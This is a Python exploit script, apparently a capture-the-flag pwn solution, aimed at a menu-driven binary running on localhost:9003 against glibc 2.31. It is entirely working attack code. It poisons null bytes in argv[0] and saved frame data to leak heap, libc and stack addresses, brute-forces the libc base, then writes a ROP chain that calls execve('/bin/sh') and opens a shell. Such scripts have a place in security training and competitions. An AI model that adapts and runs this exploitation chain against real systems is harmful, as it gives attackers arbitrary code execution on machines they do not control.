from ptrlib import *
from tqdm import tqdm

libc = ELF("./libc-2.31.so")
sock = Socket("localhost", 9003)

"""
1. Leak heap address
"""
# Prepare libc address on heap
for i in range(4):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index: ", str(i))

# Overwrite saved rbp of main function frame
sock.sendlineafter("> ", "1")
sock.sendlineafter("index: ", "6")

# Poison null byte to argv[0] and return address of main
sock.sendlineafter("> ", "2")
sock.sendlineafter("index: ", b"9" + b"\0" * (0x50 - 1))
sock.sendlineafter("data: ", "")

# Fill NULL
ok = []
logger.info("Filling NULL bytes...")
for i in tqdm(range(0x20, 0x1000)):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index: ", str(i))
    ok.append(b'done' in sock.recvline())
    if len(ok) > 10 and all(ok[-10:-1]) and not ok[-1]:
        break

# argv[0] leak
sock.sendlineafter("> ", "-1")
addr_heap = u64(sock.recvlineafter("transferring control: "))
logger.info("heap = " + hex(addr_heap))

"""
2. Leak libc address
"""
for offset in tqdm(range(0x20, 0x1000)):
    # Prepare libc address on heap
    for i in range(4):
        sock.sendlineafter("> ", "1")
        sock.sendlineafter("index: ", str(i))

    # Overwrite argv[0] and poison null byte to return address of main
    if b'\n' not in p64(addr_heap - 0x810*offset):
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("index: ", "9")
        sock.sendlineafter("data: ", p64(addr_heap - 0x810*offset))

    # argv[0] leak
    sock.sendlineafter("> ", b"-1" + b"\0" * (0x50 - 2))
    leak = sock.recvlineafter("transferring control: ")
    if leak:
        libc_base = u64(leak) - libc.main_arena() - 0x60
        libc.base = libc_base
        if libc_base & 0xfff or \
           libc_base < (0x7e00<<32) or libc_base > (0x8000<<32):
            logger.error("Bad luck! (wrong libc base)")
            exit(1)
        break
else:
    logger.warning("Bad luck! (leak failed)")
    exit(1)

"""
3. Leak stack address
"""
# Overwrite saved rbp of main function frame
sock.sendlineafter("> ", "1")
sock.sendlineafter("index: ", "6")

# Overwrite argv[0] and poison null byte to return address of main
sock.sendlineafter("> ", "2")
sock.sendlineafter("index: ", b"9" + b"\0" * (0x50 - 1))
sock.sendlineafter("data: ", p64(libc.symbol('environ')))

# argv[0] leak
sock.sendlineafter("> ", "-1")
addr_stack = u64(sock.recvlineafter("transferring control: "))
logger.info("stack = " + hex(addr_stack))

"""
3. ROP
"""
# Prepare pointer (AAW)
sock.sendlineafter("> ", "2")
sock.sendlineafter("index: ", b"9")
sock.sendlineafter("data: ", p64(addr_stack - 0x138 + 0x38))

# Write ROP chain
sock.sendlineafter("> ", "2")
sock.sendlineafter("index: ", b"37")
sock.sendlineafter("data: ", flat([
    next(libc.gadget("pop rdx; ret;")),
    0,
    next(libc.gadget("pop rsi; ret;")),
    0,
    next(libc.gadget("pop rdi; ret;")),
    next(libc.search("/bin/sh")),
    libc.symbol("execve")
], map=p64))

# Win!
sock.sendlineafter("> ", "-1")

sock.sh()
